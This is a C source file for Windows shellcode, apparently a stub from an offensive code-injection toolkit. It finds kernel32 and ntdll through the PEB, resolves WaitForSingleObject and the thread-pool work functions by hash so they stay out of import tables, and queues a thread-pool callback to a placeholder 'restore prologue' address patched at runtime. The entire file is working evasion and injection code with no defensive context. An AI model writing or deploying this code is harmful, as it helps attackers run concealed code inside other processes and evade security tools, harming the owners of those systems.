#include <Core.h>
#include <Win32.h>

SEC( text, B ) VOID Entry( VOID ) 
{
    INSTANCE Instance = { };

    Instance.Modules.Kernel32   = LdrModulePeb( HASH_KERNEL32 ); 
    Instance.Modules.Ntdll      = LdrModulePeb( HASH_NTDLL ); 
    
    if ( Instance.Modules.Kernel32 != NULL )
    {
        // Hashes were calculated with Scripts/Hasher tool
        Instance.Win32.WaitForSingleObject = LdrFunction( Instance.Modules.Kernel32, 0xdf1b3da );
    }
    

    if ( Instance.Modules.Ntdll != NULL )
    {
        // Hashes were calculated with Scripts/Hasher tool
        Instance.Win32.TpAllocWork = LdrFunction( Instance.Modules.Ntdll, 0x3fc58c37 );
        Instance.Win32.TpPostWork = LdrFunction( Instance.Modules.Ntdll, 0x4d915ab2 );
        Instance.Win32.TpReleaseWork = LdrFunction( Instance.Modules.Ntdll, 0x27a9ff4d );
    }

    // ------ Code ------
    
    // The restore prologue address - this is a place holder to be changed during runtime
    PVOID restoreEx = 0x1111111111111111;

    // Creating our TpWorkCallback pointing it to our restore prologue address
    PTP_WORK WorkReturn = NULL;
    Instance.Win32.TpAllocWork( &WorkReturn, (PTP_WORK_CALLBACK)restoreEx, NULL, NULL );
    Instance.Win32.TpPostWork( WorkReturn );
    Instance.Win32.TpReleaseWork( WorkReturn );

    // Waiting for 1 second to let the TpWorkCallback finish
    Instance.Win32.WaitForSingleObject( (HANDLE)-1, 0x1000 );

} 